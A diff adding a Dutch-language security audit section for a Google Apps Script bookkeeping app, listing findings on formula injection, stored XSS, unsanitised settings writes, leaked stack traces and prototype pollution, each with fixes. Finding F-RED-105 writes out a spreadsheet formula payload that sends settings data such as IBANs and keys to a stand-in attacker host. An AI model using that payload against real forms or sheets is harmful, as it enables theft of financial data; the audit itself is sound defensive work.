@@ -312,3 +312,40 @@ Probleem: meldFataalAanOwner_ mailt context/bericht ongemaskeerd (geen masking-l
 Fix: zelfde masker-functie op bericht/context vóór mail/audit-log. Owner: Sam (dev)
 
 Prioriteit RED-E: F-RED-085 (vervalsbare HITL-validatie) en F-RED-084 (formula-injectie richting accountant); F-RED-083 is belofte/realiteit-mismatch voor communicatie.
+
+## Batch RED-F — MoneybirdImport, NieuweBoeking, Onboarding, Prive, Referral, ResilientExecutor, SmartCategorisatie, Triggers
+Kernbevinding: dialog-pad is dubbel gesanitiseerd (saniteerObject_ + saniteer_), maar Form-/Import-paden roepen de handlers rechtstreeks aan met rauwe data. Expliciet veilig bevonden: NieuweBoeking (hex-kleur, _esc, escHtml client-side, submit-sanitisatie), Referral (hash-refcode, encodeURIComponent), ResilientExecutor, SmartCategorisatie (statische config-writes; __proto__-key op JSON-object niet exploitabel).
+
+#### F-RED-100 [HOOG] src/MoneybirdImport.gs:137-150 (idem 191-206)
+Quote: `relatiesSheet.appendRow([ id, naam, _xafTekst_(klant,'streetAddress',ns)||'', ... ]);`
+Probleem: XAF-velden (custName/adres/email/taxRegIdent/desc) ongesanitiseerd naar RELATIES/VERKOOPFACTUREN ⇒ vijandige XAF met =IMPORTXML/HYPERLINK = formula-injectie + exfiltratie; reist mee naar accountant-export.
+Fix: elk stringveld door saniteer_() vóór appendRow. Owner: Sam (dev)
+
+#### F-RED-101 [MIDDEL] src/Onboarding.gs:184,190,224
+Quote: `<input id="geboortedatum" type="date" value="${huidig.geboortedatum || ''}">`
+Probleem: 3 settings-waarden ongeëscaped in value-attribuut (regel 196 escaped wél) ⇒ stored XSS via mede-bewerker die Instellingen-cel bewerkt.
+Fix: escHtml_ zoals regel 196. Owner: Sam (dev)
+
+#### F-RED-102 [MIDDEL] src/Onboarding.gs:306 (× Setup.gs:1267-1280)
+Quote: `try { setInstelling_(naam, waarde); }`
+Probleem: dialog-invoer ongesanitiseerd naar Instellingen (setInstelling_ saniteert niet) ⇒ formule actief in Instellingen-sheet.
+Fix: saniteer_ centraal in setInstelling_. Owner: Sam (dev)
+
+#### F-RED-103 [LAAG] src/Prive.gs:219-227 — omschr/categorie/rekening ongesanitiseerd naar Privé-blad (zelf-/accountant-target). Fix: saniteer_. Owner: Sam.
+#### F-RED-104 [LAAG] src/Triggers.gs:2350-2357
+Quote: `Foutmelding: ${err.message}\n\nStack: ${err.stack}`
+Probleem: volledige stacktrace per mail ⇒ onnodig lek-oppervlak (kan property-waarden bevatten).
+Fix: alleen afgekapte message/fout-ID per mail; stack naar Logger. Owner: Sam (dev)
+
+#### F-RED-105 [HOOG] src/Triggers.gs:629-653, 964-977, 1151-1161, 1302-1328 (× Boekingen.gs:1140-1143)
+Quote: `factuurData = [ ..., klantnaam, data['KvK-nummer klant']||'', ..., regels.map(r=>r.omschr).join('; '), ... ]; vfSheet.appendRow(factuurData);`
+Probleem: Google-Form-paden + zoekOfMaakRelatie_ schrijven form-velden ongesanitiseerd naar VF/IF/RELATIES, terwijl het dialog-pad wél dubbel saniteert — kerninconsistentie. Form is doorgaans open-met-link ⇒ externe kan =IMPORTXML("//attacker?d="&JOIN(",",Instellingen!B:B)) insturen ⇒ exfiltratie van Instellingen (IBAN/keys) of phishing; reist mee in PDF/UBL naar de klant.
+Fix: saniteerObject_(data) direct na opbouw in verwerkHoofdformulier (466) en verwerkVerkoopfactuurFormulier (1252); saniteer_ op displayNaam.
+Owner: Sam (dev)
+
+#### F-RED-106 [MIDDEL] src/Triggers.gs:462-481 (+1248-1252)
+Quote: `antwoorden.forEach(r => { data[r.getItem().getTitle()] = r.getResponse(); });`
+Probleem: form-item-TITELS als object-keys zonder Object.create(null)/allowlist; Form-pad mist de saniteerObject_-key-guard van het dialog-pad ⇒ __proto__/constructor-titel = prototype-pollution-oppervlak (vereist Form-controle ⇒ MIDDEL).
+Fix: Object.create(null) + titel-allowlist + zelfde saniteerObject_. Owner: Sam (dev)
+
+Prioritaire lijn RED-F: centrale sanitisatie op Form/Import-pad (dekt 100+105), setInstelling_-saniteer (102), Onboarding-escapes (101).
